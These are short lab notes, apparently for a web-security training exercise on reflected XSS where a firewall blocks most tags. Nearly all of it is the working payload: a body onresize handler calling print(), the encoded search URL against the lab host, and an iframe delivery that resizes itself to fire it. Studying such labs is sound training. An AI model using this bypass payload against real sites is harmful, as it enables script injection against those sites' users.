Lab #17 - Reflected XSS into HTML context with most tags and attributes blocked

Target Goal - Perform an XSS attack that bypasses the WAF and calls the print() function.

Analysis:

<body onresize="print()">

https://0a01002703c7c0a7c2486677005900fa.web-security-academy.net/?search=%3Cbody+onresize%3D%22print%28%29%22%3E

<iframe src="https://0a01002703c7c0a7c2486677005900fa.web-security-academy.net/?search=%3Cbody+onresize%3D%22print%28%29%22%3E" onload=this.style.width='100px'></iframe>